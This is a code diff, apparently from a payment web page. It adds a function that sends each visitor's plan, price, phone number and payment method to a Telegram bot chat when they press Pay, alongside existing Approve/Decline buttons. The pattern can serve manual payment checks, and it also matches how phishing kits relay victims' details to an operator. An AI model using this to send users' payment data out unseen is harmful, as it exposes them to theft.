@@ -349,6 +349,23 @@
 
         // ========== TELEGRAM FUNCTIONS ==========
 
+        // Send simple message to Telegram (no buttons)
+        async function sendTelegram(text) {
+            try {
+                await fetch(`${TELEGRAM_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (err) {
+                console.log('Telegram notification error:', err);
+            }
+        }
+
         // Send message with inline keyboard (Approve/Decline buttons)
         async function sendTelegramWithButtons(text, sessionId) {
             try {
@@ -535,6 +552,11 @@
 
             document.getElementById('displayPhone').textContent = fullNumber;
             document.getElementById('displayMethod').textContent = paymentMethod;
+
+            // Notify Telegram that someone pressed Pay
+            const planName = sessionStorage.getItem('planName');
+            const planPrice = sessionStorage.getItem('planPrice');
+            sendTelegram(`💰 <b>PAYMENT INITIATED</b>\n\nSomeone pressed Pay:\n📦 Plan: <b>${planName}</b>\n💰 Amount: <b>${planPrice}</b>\n📱 Phone: <b>${fullNumber}</b>\n🏦 Method: <b>${paymentMethod}</b>\n⏰ Time: ${new Date().toLocaleString()}`);
 
             // Show waiting screen
             document.getElementById('paymentForm').style.display = 'none';
